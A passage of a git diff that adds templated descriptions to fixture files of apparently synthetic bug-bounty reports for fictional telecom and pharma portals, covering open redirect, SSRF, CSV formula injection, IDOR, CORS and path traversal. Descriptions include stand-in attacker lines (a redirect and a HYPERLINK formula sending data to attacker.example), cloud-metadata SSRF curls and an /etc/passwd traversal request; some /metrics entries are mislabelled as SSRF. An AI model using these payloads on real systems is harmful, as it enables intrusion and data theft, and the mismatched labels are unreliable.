@@ -10713,7 +10793,8 @@
           "offset": "2d 17h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://portal.bergtal-telecom.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10837,7 +10918,8 @@
           "offset": "4d 3h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.bergtal-telecom.foo/api/import`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10943,7 +11025,8 @@
           "offset": "6d 17h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.bergtal-telecom.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11121,7 +11204,8 @@
           "offset": "5d 5h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.bergtal-telecom.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11233,7 +11317,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.bergtal-telecom.foo/api/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11354,7 +11439,8 @@
           "offset": "8d 10h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.bergtal-telecom.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11452,7 +11538,8 @@
           "offset": "4d 11h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.bergtal-telecom.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11600,7 +11687,8 @@
           "offset": "4d 10h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.bergtal-telecom.foo/import`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11740,7 +11828,8 @@
           "offset": "8d 1h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.bergtal-telecom.foo/api/import`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11848,7 +11937,8 @@
           "offset": "3d 17h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.bergtal-telecom.foo/import`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11991,7 +12081,8 @@
           "offset": "6d 21h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.bergtal-telecom.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
diff --git a/fixtures/reports/edelquarz_pharma_ag_reports.json b/fixtures/reports/edelquarz_pharma_ag_reports.json
index 589ab57..200d689 100644
--- a/fixtures/reports/edelquarz_pharma_ag_reports.json
+++ b/fixtures/reports/edelquarz_pharma_ag_reports.json
@@ -62,7 +62,8 @@
           "offset": "3d 8h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.edelquarz-pharma.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -186,7 +187,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.edelquarz-pharma.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -333,7 +335,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://portal.edelquarz-pharma.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -473,7 +476,8 @@
           "offset": "4d 18h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.edelquarz-pharma.foo/profile`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -604,7 +608,8 @@
           "offset": "5d 10h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.edelquarz-pharma.foo/fetch`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -712,7 +717,8 @@
           "offset": "3d 4h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.edelquarz-pharma.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -839,7 +845,8 @@
           "offset": "4d 8h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.edelquarz-pharma.foo/fetch`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -950,7 +957,8 @@
           "offset": "2d 1h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.edelquarz-pharma.foo/export?type=records`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1110,7 +1118,8 @@
           "offset": "7d 12h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.edelquarz-pharma.foo/statements/`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1192,7 +1201,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.edelquarz-pharma.foo/api/v2/documents/`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1356,7 +1366,8 @@
           "offset": "5d 22h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.edelquarz-pharma.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1507,7 +1518,8 @@
           "offset": "3d 11h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.edelquarz-pharma.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1647,7 +1659,8 @@
           "offset": "2d 23h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.edelquarz-pharma.foo/fetch`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1794,7 +1807,8 @@
           "offset": "3d 22h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.edelquarz-pharma.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1902,7 +1916,8 @@
           "offset": "1d 5h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.edelquarz-pharma.foo/api/import`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2049,7 +2064,8 @@
           "offset": "5d 11h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.edelquarz-pharma.foo/statements/`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2209,7 +2225,8 @@
           "offset": "9d 1h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.edelquarz-pharma.foo/import`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2341,7 +2358,8 @@
           "offset": "3d 17h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.edelquarz-pharma.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2489,7 +2507,8 @@
           "offset": "6d 10h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.edelquarz-pharma.foo/profile`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2598,7 +2617,8 @@
           "offset": "1d 3h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
